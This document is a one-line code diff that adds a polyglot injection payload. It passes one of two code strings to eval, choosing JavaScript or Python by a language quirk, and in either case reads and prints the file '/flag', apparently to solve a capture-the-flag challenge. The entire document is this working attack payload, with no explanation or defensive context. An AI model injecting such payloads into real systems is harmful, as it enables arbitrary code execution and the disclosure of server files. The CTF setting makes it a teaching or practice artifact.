@@ -1,0 +1,1 @@
+eval(["const fs = require('fs');fs.readFile('/flag', 'utf8', (err, data) => {if (err) {console.error(err);return;  }  process.stdout.write(data);});", "print(open('/flag', 'r').read(), end='')"][([] == 0) ^ 1])
